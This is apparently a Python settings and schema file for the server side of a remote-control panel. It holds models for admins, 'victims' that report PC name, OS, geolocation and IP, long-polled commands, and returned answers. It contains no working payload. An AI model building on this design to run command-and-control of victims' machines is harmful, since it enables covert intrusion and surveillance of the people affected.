from pydantic_settings import BaseSettings
from pydantic import PostgresDsn, BaseModel


class Settings(BaseSettings):
    db_name: str
    db_pass: str
    db_url: PostgresDsn
    debug: bool
    seed: int

    class Config:
        env_file = ".env"
        env_file_encoding = "utf-8"


# settings = Settings()
# print(settings)

class RegisterAdmin(BaseModel):
    admin_login: str
    admin_hash_password: str
    is_super_admin: bool = False
    is_active: bool = True


class SetActiveAdmin(BaseModel):
    admin_login: str
    is_active: bool


class DeleteAdmin(BaseModel):
    bottom_admin_login: str


class AuthAdmin(BaseModel):
    admin_login: str
    admin_hash_password: str


class Victim(BaseModel):
    pc_name: str
    victim_hash_id: str


class RegisterVictim(BaseModel):
    pc_name: str


class UpdateDataVictim(BaseModel):
    os_name: str
    geolocation: str
    victim_ip: str


class LoginVictim(BaseModel):
    victim_hash_id: str

# TODO see what can be done with code repetition


class LongpoolVictim(BaseModel):
    victim_hash_id: str


class Command(BaseModel):
    victim_id: int
    command: str


class Answer(BaseModel):
    victim_hash_id: str
    admin_id: int
    answer: str
    type_answer: str
